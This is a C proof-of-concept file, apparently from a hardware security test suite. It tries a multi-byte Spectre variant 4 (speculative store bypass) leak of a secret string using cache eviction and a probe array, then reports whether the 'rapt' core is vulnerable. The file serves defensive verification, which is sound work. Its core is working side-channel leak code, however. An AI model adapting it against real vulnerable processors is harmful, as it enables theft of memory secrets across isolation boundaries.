/**
 * spectre-v4: Speculative Store Bypass (SSB), multi-byte attempt.
 *
 * Variant 4 lets a younger load speculatively bypass an older store whose
 * address is not yet resolved, reading a stale value.  The core blocks ANY
 * younger load while an older store address is unresolved
 * (rapt_lsu_ioq.sv:508-535, !ioq_addr_ready; no nuke/replay), so it is
 * structurally immune on a single hart.  This PoC attempts to leak a secret
 * string through the stale value and confirms the immunity with a live
 * positive control: the younger load must wait for address resolution, so no
 * stale byte is ever observed.  (spec-store-bypass.c is the single-byte form.)
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 80
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif

static uint8_t target_line[SC_LINE_BYTES]
    __attribute__((aligned(SC_LINE_BYTES)));
static uint8_t *ptr_slot[8] __attribute__((aligned(SC_LINE_BYTES)));
static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));
static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";

int main(void) {
  if (sc_time_selfcheck("spectre-v4") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-v4 ERROR reason=evict\n");
    return 1;
  }
  ptr_slot[0] = target_line;
  uint8_t *q = target_line;
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  /* Positive control: architectural forwarding of a known value registers. */
  int pos_ok_cnt = 0;
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    target_line[0] = 0x42;
    sc_fence();
    uint8_t *p = ptr_slot[0];
    *p = 0x42;
    uint8_t leaked = *q;
    volatile uint8_t t = probe_array[(uintptr_t)leaked * SC_PROBE_STRIDE];
    (void)t;
    sc_fence();
    sc_score_t pos;
    sc_score_reset(&pos);
    sc_probe_array(probe_array, &g, &pos, 0xa11ce + r);
    if (pos.hits[0x42] > 0)
      pos_ok_cnt++;
  }
  int pos_ok = pos_ok_cnt >= (int)R / 2;

  /* Multi-byte SSB attempt: stale value would be the pre-store secret byte. */
  uint32_t stale_total = 0;
  int matched = 0;
  printf("[spectre-v4] attempting %d-byte SSB leak:\n", SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    uint8_t stale = (uint8_t)secret_str[i];
    uint32_t stale_cnt = 0;
    sc_score_t atk;
    sc_score_reset(&atk);
    for (uint32_t r = 0; r < R; r++) {
      sc_evict_capacity(&g);
      target_line[0] = stale;       /* pre-store value = secret byte */
      sc_fence();
      sc_evict_l1((const void *)ptr_slot, &g); /* cold store address */
      sc_evict_l2((const void *)ptr_slot, &g);
      sc_fence();
      uint8_t *p = ptr_slot[0];     /* unresolved store address */
      *p = 0x00;                    /* older store overwrites */
      uint8_t leaked = *q;          /* younger load: stale if SSB */
      if (leaked == stale)
        stale_cnt++;
      volatile uint8_t t = probe_array[(uintptr_t)leaked * SC_PROBE_STRIDE];
      (void)t;
      sc_fence();
      sc_probe_array(probe_array, &g, &atk, 0x51de + r);
      atk.rounds++;
    }
    int got = sc_argmax(&atk);
    stale_total += stale_cnt;
    matched += (got == stale && stale_cnt > R / 4);
    printf("  [%2d] stale=0x%02x got=0x%02x stale_reads=%u/%u\n",
           i, stale, got, (unsigned)stale_cnt, (unsigned)R);
  }
  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT spectre-v4 %s pos=%d stale_total=%u rounds=%u\n",
         (stale_total > R / 4) ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok,
         (unsigned)stale_total, (unsigned)R);
  printf("SCRESULT spectre-v4-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  if (stale_total > R / 4 || multibit_ok)
    printf("[spectre-v4] VULNERABLE: speculative store bypass leak\n");
  else if (!pos_ok)
    printf("[spectre-v4] INCONCLUSIVE: positive control failed\n");
  else
    printf("[spectre-v4] NOT VULNERABLE: younger load blocked behind "
           "unresolved store (structural immunity, control live)\n");
  return 0;
}